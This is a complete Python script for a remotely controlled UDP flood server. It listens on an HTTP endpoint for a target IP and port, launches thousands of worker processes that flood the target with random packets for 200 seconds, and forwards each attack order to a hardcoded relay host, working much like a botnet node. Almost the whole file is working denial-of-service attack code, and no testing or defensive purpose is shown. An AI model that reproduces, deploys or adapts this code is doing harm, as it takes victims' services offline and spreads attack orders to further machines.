

#!/usr/bin/env python3
import socket
import random
import threading
import time
import json
from http.server import HTTPServer, BaseHTTPRequestHandler
from io import BytesIO
from urllib.parse import urlparse, parse_qs
import hashlib
import secrets
import os
import multiprocessing as mp
from queue import Queue

# Configuration
PORT = 3105
ATTACK_DURATION = 200
PACKET_SIZE = 128
WORKERS_PER_CORE = 500
SECRET_KEY = b'f7d8e9c0b1a2d3e4f5g6h7i8j9k0l1m2n3o4p5q6r7s8t9u0v1w2x3y4z5'
CLONE_SERVER_IP = "node69.lunes.host"
CLONE_SERVER_PORT = 3028
import http.client

def forward_to_clone_server(data):
    """Forward the attack request to clone server"""
    try:
        conn = http.client.HTTPConnection(CLONE_SERVER_IP, CLONE_SERVER_PORT, timeout=5)
        headers = {'Content-Type': 'application/json'}
        conn.request("POST", "/proxy", json.dumps(data), headers)
        response = conn.getresponse()
        print(f"[FORWARD] Request forwarded to {CLONE_SERVER_IP}:{CLONE_SERVER_PORT}, Status: {response.status}")
        conn.close()
    except Exception as e:
        print(f"[FORWARD] Failed to forward to clone server: {e}")

class UDPFloodWorker(mp.Process):
    def __init__(self, target_ip, target_port, duration, worker_id, stats_queue, attack_start_time):
        super().__init__()
        self.target_ip = target_ip
        self.target_port = target_port
        self.duration = duration
        self.worker_id = worker_id
        self.stats_queue = stats_queue
        self.attack_start_time = attack_start_time  # Shared start time
        self.running = mp.Event()
        self.running.set()
        
    def run(self):
        packets_sent = 0
        bytes_sent = 0
        worker_start_time = time.time()
        
        # Create RAW UDP socket
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 64 * 1024 * 1024)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        
        # Generate random packet
        packet = secrets.token_bytes(PACKET_SIZE)
        
        print(f"[Worker {self.worker_id}] Starting flood to {self.target_ip}:{self.target_port}")
        
        # FIXED: Use attack_start_time for consistent duration across all workers
        try:
            while self.running.is_set() and (time.time() - self.attack_start_time) < self.duration:
                try:
                    # Send packets
                    for _ in range(1000):
                        sock.sendto(packet, (self.target_ip, self.target_port))
                        packets_sent += 1
                        bytes_sent += PACKET_SIZE
                except Exception as e:
                    # Don't break on errors, just continue
                    continue
        except KeyboardInterrupt:
            pass
        finally:
            sock.close()
        
        # Send stats back
        worker_end_time = time.time()
        self.stats_queue.put({
            'worker_id': self.worker_id,
            'packets': packets_sent,
            'bytes': bytes_sent,
            'duration': worker_end_time - worker_start_time
        })
        
        print(f"[Worker {self.worker_id}] Finished: {packets_sent:,} packets in {worker_end_time - worker_start_time:.1f}s")

class UDPFloodAttack:
    def __init__(self, attack_id, target_ip, target_port, duration):
        self.attack_id = attack_id
        self.target_ip = target_ip
        self.target_port = target_port
        self.duration = duration
        self.workers = []
        self.running = False
        self.stats_queue = mp.Queue()
        self.attack_start_time = None  # Will be set in start()
        
        num_cores = mp.cpu_count()
        self.total_workers = num_cores * WORKERS_PER_CORE
        
        print(f"[Attack {attack_id}] Initializing with {self.total_workers} workers")
        print(f"[Attack {attack_id}] Target: {target_ip}:{target_port}")
        print(f"[Attack {attack_id}] Duration: {duration}s")
        
    def start(self):
        if self.running:
            return
            
        self.running = True
        self.attack_start_time = time.time()  # Set the shared start time
        self.end_time = self.attack_start_time + self.duration  # Calculate end time
        
        print(f"\n[Attack {self.attack_id}] LAUNCHING ATTACK!")
        print(f"[Attack {self.attack_id}] Start: {time.ctime(self.attack_start_time)}")
        print(f"[Attack {self.attack_id}] End: {time.ctime(self.end_time)}")
        print(f"[Attack {self.attack_id}] Creating {self.total_workers} workers...")
        
        # Create worker processes
        for i in range(self.total_workers):
            worker = UDPFloodWorker(
                self.target_ip,
                self.target_port,
                self.duration,
                i,
                self.stats_queue,
                self.attack_start_time  # Pass the shared start time
            )
            self.workers.append(worker)
            worker.start()
            
            # Stagger startup
            if i % 100 == 0 and i > 0:
                time.sleep(0.01)
        
        print(f"[Attack {self.attack_id}] All workers started")
        
        # Monitor attack
        self.monitor()
        
    def stop(self):
        if not self.running:
            return
            
        print(f"[Attack {self.attack_id}] Stopping attack...")
        self.running = False
        for worker in self.workers:
            if worker.is_alive():
                worker.running.clear()
                worker.terminate()
                worker.join(timeout=1)
        print(f"[Attack {self.attack_id}] All workers stopped")
        
    def monitor(self):
        last_packets = 0
        last_time = time.time()
        stats_collection_interval = 5  # Collect stats every 5 seconds
        
        print(f"[Attack {self.attack_id}] Monitoring started. Will run for {self.duration}s")
        
        while self.running and time.time() < self.end_time:
            time.sleep(stats_collection_interval)
            
            if not self.running:
                break
                
            # Calculate time remaining
            time_remaining = max(0, self.end_time - time.time())
            
            # Collect stats from workers
            total_packets = 0
            total_bytes = 0
            
            # Check queue for stats
            while not self.stats_queue.empty():
                try:
                    stats = self.stats_queue.get_nowait()
                    total_packets += stats['packets']
                    total_bytes += stats['bytes']
                except:
                    break
            
            current_time = time.time()
            elapsed = current_time - self.attack_start_time
            time_since_last = current_time - last_time
            
            if time_since_last > 0:
                pps = int((total_packets - last_packets) / time_since_last)
                mbps = ((total_bytes - last_packets * PACKET_SIZE) / time_since_last * 8) / (1024 * 1024)
            else:
                pps = 0
                mbps = 0
            
            print(f"\n[STATS {self.attack_id}]")
            print(f"  Elapsed: {elapsed:.1f}s / {self.duration}s")
            print(f"  Remaining: {time_remaining:.1f}s")
            print(f"  Total Packets: {total_packets:,}")
            print(f"  Current PPS: {pps:,}")
            print(f"  Bandwidth: {mbps:.2f} Mbps")
            print(f"  Active Workers: {sum(1 for w in self.workers if w.is_alive())}/{len(self.workers)}")
            
            last_packets = total_packets
            last_time = current_time
        
        # Attack duration is over, stop all workers
        print(f"[Attack {self.attack_id}] Attack duration ({self.duration}s) complete. Stopping...")
        self.stop()
        
        # Final stats
        final_time = time.time()
        total_elapsed = final_time - self.attack_start_time
        
        # Collect final stats
        final_packets = 0
        final_bytes = 0
        while not self.stats_queue.empty():
            try:
                stats = self.stats_queue.get_nowait()
                final_packets += stats['packets']
                final_bytes += stats['bytes']
            except:
                break
        
        if total_elapsed > 0:
            avg_pps = int(final_packets / total_elapsed)
            avg_mbps = ((final_bytes / total_elapsed) * 8) / (1024 * 1024)
        else:
            avg_pps = 0
            avg_mbps = 0
        
        print(f"\n[Attack {self.attack_id}] ATTACK COMPLETED")
        print(f"  Total Duration: {total_elapsed:.1f}s")
        print(f"  Final Packets: {final_packets:,}")
        print(f"  Average PPS: {avg_pps:,}")
        print(f"  Average Bandwidth: {avg_mbps:.2f} Mbps")
        print(f"  Packet Size: {PACKET_SIZE} bytes")


class HTTPHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        if self.path == '/proxy':
            content_length = int(self.headers['Content-Length'])
            body = self.rfile.read(content_length)
            
            try:
                data = json.loads(body.decode('utf-8'))
                
                # Extract data
                device_id = data.get('device_id', '')
                target = data.get('ip', '')
                target_port = data.get('port', 9339)
                
                # Simple validation
                if not device_id or not target:
                    self.send_error(400, 'Missing parameters')
                    return
                
                # STEP 1: Forward to clone server
                print(f"\n[HTTP] Received attack request, forwarding to clone server...")
                if CLONE_SERVER_IP and CLONE_SERVER_IP != "0.0.0.0":
                    threading.Thread(target=forward_to_clone_server, args=(data,), daemon=True).start()
                
                # STEP 2: Start local attack
                attack_id = f"PY-{int(time.time())}-{secrets.token_hex(4).upper()}"
                
                print(f"[HTTP] Starting local Python attack: {attack_id}")
                print(f"[HTTP] Target: {target}:{target_port}")
                
                # Start attack in background thread
                attack = UDPFloodAttack(attack_id, target, int(target_port), ATTACK_DURATION)
                threading.Thread(target=attack.start, daemon=True).start()
                
                # Respond
                self.send_response(200)
                self.send_header('Content-Type', 'application/json')
                self.end_headers()
                
                response = {
                    'success': True,
                    'message': f'Attack started and forwarded to clone server {CLONE_SERVER_IP}',
                    'attack_id': attack_id,
                    'workers': attack.total_workers,
                    'packet_size': PACKET_SIZE,
                    'duration': ATTACK_DURATION,
                    'cooldown': 250
                }
                
                self.wfile.write(json.dumps(response).encode('utf-8'))
                
            except Exception as e:
                print(f"[HTTP] Error: {e}")
                self.send_error(500, str(e))
                
        else:
            self.send_error(404)
    
    def do_GET(self):
        if self.path == '/health':
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.end_headers()
            
            response = {
                'success': True,
                'status': 'online',
                'app': 'Python MAX PPS UDP Flood',
                'version': 'PY-RAW-v1.0',
                'cpu_cores': mp.cpu_count(),
                'workers_per_core': WORKERS_PER_CORE,
                'packet_size': PACKET_SIZE,
                'duration': ATTACK_DURATION
            }
            
            self.wfile.write(json.dumps(response).encode('utf-8'))
        else:
            self.send_error(404)

def main():
    print(f"\n{'='*60}")
    print("PYTHON MAXIMUM PPS UDP FLOOD SERVER")
    print(f"Port: {PORT}")
    print(f"CPU Cores: {mp.cpu_count()}")
    print(f"Workers per core: {WORKERS_PER_CORE}")
    print(f"Total workers: {mp.cpu_count() * WORKERS_PER_CORE}")
    print(f"Packet size: {PACKET_SIZE} bytes")
    print(f"Expected PPS: 1,000,000+")
    print(f"{'='*60}")
    print("WARNING: This requires ROOT/ADMIN privileges for raw sockets!")
    print(f"{'='*60}\n")
    
    # Check for root/admin
    if os.geteuid() != 0:
        print("[WARNING] Not running as root. Performance will be limited.")
        print("Run with: sudo python3 py_flood.py")
    
    server = HTTPServer(('0.0.0.0', PORT), HTTPHandler)
    print(f"[SERVER] Listening on port {PORT}")
    print(f"[SERVER] Ready to receive attacks via POST /proxy")
    
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n[SERVER] Shutting down...")
        server.server_close()

if __name__ == '__main__':
    main()
